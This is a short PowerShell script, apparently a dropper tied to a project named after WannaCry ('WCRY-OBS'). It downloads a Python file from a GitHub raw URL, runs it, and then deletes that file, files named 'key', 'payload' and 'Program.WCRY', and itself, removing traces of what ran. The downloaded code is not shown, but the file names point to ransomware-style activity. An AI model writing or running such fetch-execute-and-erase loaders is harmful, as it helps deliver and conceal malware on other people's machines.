$scriptName = $MyInvocation.MyCommand.Name
$url = 'https://raw.githubusercontent.com/bookbot2019/WCRY-OBS/main/Oshawott.py'
Invoke-WebRequest -Uri $url -Outfile "Oshawott.py"
python3 "Oshawott.py"
Remove-Item "Oshawott.py"
Remove-Item "key"
Remove-Item "payload"
Remove-Item "Program.WCRY"
Remove-Item $scriptName
